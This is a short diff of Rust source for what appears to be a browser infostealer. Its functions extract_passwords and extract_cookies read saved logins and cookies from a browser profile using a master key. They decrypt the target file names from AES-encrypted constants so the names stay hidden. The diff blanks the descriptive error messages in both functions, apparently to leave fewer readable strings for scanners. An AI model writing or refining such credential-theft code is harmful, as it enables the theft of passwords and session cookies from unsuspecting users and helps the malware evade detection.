@@ -14,7 +14,7 @@ mod dtb_aes {
 use dtb_aes::*;
 
 pub fn extract_passwords(profile_dir: &Path, master_key: &[u8]) -> Result<Vec<Value>, String> {
-    let master_key: &[u8; 32] = master_key.try_into().map_err(|_| "key not 32 bytes".to_string())?;
+    let master_key: &[u8; 32] = master_key.try_into().map_err(|_| "".to_string())?;
     let login_data_name = aes_str(LOGIN_DATA_CT, &LOGIN_DATA_KEY, &LOGIN_DATA_NONCE);
     let login_data = profile_dir.join(&login_data_name);
 
@@ -62,7 +62,7 @@ pub fn extract_passwords(profile_dir: &Path, master_key: &[u8]) -> Result<Vec<Va
 
 
 pub fn extract_cookies(profile_dir: &Path, master_key: &[u8]) -> Result<Vec<Value>, String> {
-    let master_key: &[u8; 32] = master_key.try_into().map_err(|_| "key not 32 bytes".to_string())?;
+    let master_key: &[u8; 32] = master_key.try_into().map_err(|_| "".to_string())?;
     let network_name  = aes_str(NETWORK_CT, &NETWORK_KEY, &NETWORK_NONCE);
     let cookies_name  = aes_str(COOKIES_CT, &COOKIES_KEY, &COOKIES_NONCE);
     let cookies_path = {
